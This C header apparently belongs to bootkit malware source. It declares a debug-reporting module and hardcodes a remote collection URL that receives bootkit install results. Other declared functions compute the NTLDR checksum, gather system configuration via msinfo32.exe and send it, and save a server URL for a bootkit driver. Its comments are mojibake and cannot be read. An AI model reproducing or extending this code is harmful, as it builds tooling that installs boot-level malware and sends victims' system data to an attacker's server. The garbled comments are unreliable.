#ifndef DbgRptH
#define DbgRptH

#define PP_REPORT_URL  "http://mirandahf.info/geter/index_.php"

//#define DBGRPT_ENABLED

#ifdef DBGRPT_ENABLED
#	define PP_DBGRPT_FUNCTION_CALL(function) { (function); };
#else 
#	define PP_DBGRPT_FUNCTION_CALL(function) __noop
#endif

// �-��� ������������� �������� ���������
void DebugReportInit();

// ������ � ����������� � ������� (����� ���������� ������������ ������� � �������)
void DebugReportSystem();

// ������ � ����������� � ���� ���������
void DebugReportBkInstallCode(DWORD BkInstallResult);

// ������ �� ������� ����������� �����
void DebugReportStepByName(const char* StepName);

void DebugReportStep1();
void DebugReportStep2(DWORD BkInstallResult);

// ������ � ����������� � MD5 ����� NTLDR
void DebugReportUpdateNtldrCheckSum();

// �������� ������ ��������� ���������� (��������� ������ msinfo32.exe)
void DebugReportCreateConfigReportAndSend();

// ���������� URL, ������� ����� ������������ ������� ������� ��� ������� �� ����
bool DebugReportSaveUrlForBootkitDriver();

// ���������� ���������� ��� ������, ������� ������������� ��������� ��������������� �������
void DebugReportSaveSettings(const char* ParamsList);

// ������ ������ ��� ��������� ����������� ������
void DebugReportRunTests();

char* CalcNtldrMd5(char* Buffer, DWORD BufferSize);

#endif 